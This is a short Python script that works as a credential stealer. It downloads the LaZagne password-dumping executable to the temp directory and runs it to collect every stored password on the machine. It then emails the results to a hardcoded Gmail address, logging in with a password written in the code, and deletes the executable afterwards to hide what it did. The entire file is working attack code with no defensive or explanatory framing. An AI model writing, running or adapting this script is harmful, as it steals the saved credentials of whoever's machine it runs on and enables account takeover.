import requests, subprocess, smtplib, os, tempfile

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as new_file:
		new_file.write(get_response.content)

def send_mail(email,password,message):
	server= smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email,password)
	print("login successfull")
	server.sendmail(email, email, message)
	server.quit()

temp_dir=tempfile.gettempdir()
os.chdir(temp_dir)

download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
mess=subprocess.check_output("lazagne.exe all" , shell=True)
send_mail("srivastavanuj21@gmail.com", "aeiou1234", mess)
os.remove("lazagne.exe")
